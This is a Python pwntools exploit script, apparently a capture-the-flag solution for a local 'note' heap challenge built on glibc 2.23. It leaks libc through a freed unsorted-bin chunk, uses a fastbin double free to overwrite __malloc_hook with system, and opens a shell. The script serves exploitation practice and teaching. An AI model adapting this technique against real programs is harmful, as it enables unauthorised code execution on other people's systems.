from pwn import *

def add(size, note):
	p.recvuntil(b'> \n')
	p.sendline(b'1')
	p.recvuntil(b'Size: ')
	p.sendline(str(size))
	p.recvuntil(b'Note: ')
	p.sendline(note)

def show(idx):
	p.recvuntil(b'> \n')
	p.sendline(b'2')
	p.recvuntil(b'Index: ')
	p.sendline(str(idx))

def delete(idx):
	p.recvuntil(b'> \n')
	p.sendline(b'3')
	p.recvuntil(b'Index: ')
	p.sendline(str(idx))

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./note')
elf = ELF('./note')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

add(0x800, b'a')
add(0x60, b'b')
add(0x60, b'c')

# leak libc
delete(0)
show(0)
p.recvuntil(b'Note 0:\n')
main_arena_96 = u64(p.recvline()[0:-1] + b'\x00' * 0x2)
libc_base = main_arena_96 - 0x3c4b78
print('libc base:', hex(libc_base))

malloc_hook = libc_base + libc.symbols['__malloc_hook']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

# use fastbin_dup
delete(1)
delete(2)
delete(1)

add(0x60, p64(malloc_hook - 0x23))
add(0x60, b'a')
add(0x60, b'a')

print("malloc_hook:", hex(malloc_hook))

# overwrite __malloc_hook
add(0x60, b'a' * 0x13 + p64(system))

# get shell
p.recvuntil(b'> \n')
p.sendline(b'1')
p.recvuntil(b'Size: ')
p.sendline(str(bin_sh))

p.interactive()